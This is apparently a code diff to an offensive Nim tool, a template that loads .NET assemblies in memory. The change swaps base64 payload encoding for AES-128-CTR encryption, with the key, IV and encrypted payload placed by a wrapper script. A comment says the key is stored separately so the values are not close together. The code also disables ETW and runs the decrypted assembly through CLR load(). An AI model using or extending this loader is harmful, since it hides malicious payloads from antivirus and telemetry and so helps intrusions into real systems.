@@ -17,12 +17,15 @@
         https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
 ]#
 
-import winim/clr
+import nimcrypto
+import winim/clr except `[]`
 import strformat
 import os
 import dynlib
 import strenc
-import base64
+
+# BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: const cryptKey: array[16, byte] = [byte 0x50,0x61,0x4e, ...]
+#[ PLACEHOLDERCRYPTKEY ]#
 
 # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let verbose = false
 #[ PLACEHOLDERVERBOSE ]#
@@ -96,16 +99,38 @@ when isMainModule:
         if verbose:
             echo fmt"[*] ETW disabled: {bool(success)}"
 
-    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let b64buf : noCryptString = "TVqQAAMAAAAEAA=="
-    #[ PLACEHOLDERBENCBIN ]#
+    #[
+        BELOW LINES WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE:
+        let 
+            cryptedInput: array[11, byte] = [byte 0x50,0x9d,0xaa,0xd5,0xdb,0xfc,0xc1,0x53,0xac,0xe2,0x27]
+            cryptIV: array[16, byte] = [byte 0x11,0x65,0xde,0x9f,0xfe,0xc9,0x15,0x33,0x6e,0x0a,0x8a,0x2e,0x4a,0x2d,0xff,0xb7]
 
-    ## Converts a string to the corresponding byte sequence.
+        (key is defined separately as a const to prevent the values from being too close together)
+    ]#
+    #[ PLACEHOLDERCRYPTEDINPUT ]#
+    #[ PLACEHOLDERCRYPTIV ]#
+
+    # Decrypt the encrypted bytes
     func toByteSeq*(str: string): seq[byte] {.inline.} =
         @(str.toOpenArrayByte(0, str.high))
 
-    var buf = toByteSeq(decode(b64buf))
+    var
+        dctx: CTR[aes128]
+        key : array[aes128.sizeKey, byte]
+        iv : array[aes128.sizeBlock, byte]
+        enctext = newSeq[byte](len(cryptedInput))
+        dectext = newSeq[byte](len(cryptedInput))
 
-    var assembly = load(buf)
+    key = cryptKey
+    iv = cryptIV
+
+    copyMem(unsafeAddr enctext[0], unsafeAddr cryptedInput[0], len(cryptedInput))
+
+    dctx.init(key, iv)
+    dctx.decrypt(enctext, dectext)
+    dctx.clear()
+
+    var assembly = load(dectext)
 
     # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let arr = toCLRVariant(["argument1", "argument2"], VT_BSTR)
     #[ PLACEHOLDERARGUMENTS ]#
